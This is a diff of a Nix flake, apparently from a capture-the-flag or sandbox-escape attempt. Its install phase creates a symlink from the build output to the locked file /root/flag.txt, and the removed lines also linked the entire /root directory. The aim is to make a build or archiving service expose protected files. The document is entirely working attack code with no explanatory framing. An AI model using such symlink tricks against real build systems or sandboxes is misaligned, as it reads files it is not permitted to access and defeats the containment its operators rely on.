@@ -1,5 +1,5 @@
 {
-  description = "Symlink Sandbox Escape";
+  description = "Direct Symlink Dereference Attack";
 
   inputs = {
     nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
@@ -11,21 +11,14 @@
     pkgs = import nixpkgs { inherit system; };
   in {
     packages.${system}.default = pkgs.stdenv.mkDerivation {
-      pname = "symlink-escape";
+      pname = "direct-symlink";
       version = "1.0";
       src = ./.;
 
-      # Do nothing during the build phase, just succeed.
       buildPhase = "true";
 
       installPhase = ''
-        mkdir -p $out
-        
-        # Create a malicious symlink pointing directly to the locked flag
-        ln -s /root/flag.txt $out/flag.txt
-        
-        # Bonus: Let's symlink the entire root directory just in case it zips the output
-        ln -s /root $out/root_dir
+        ln -s /root/flag.txt $out
       '';
     };
   };
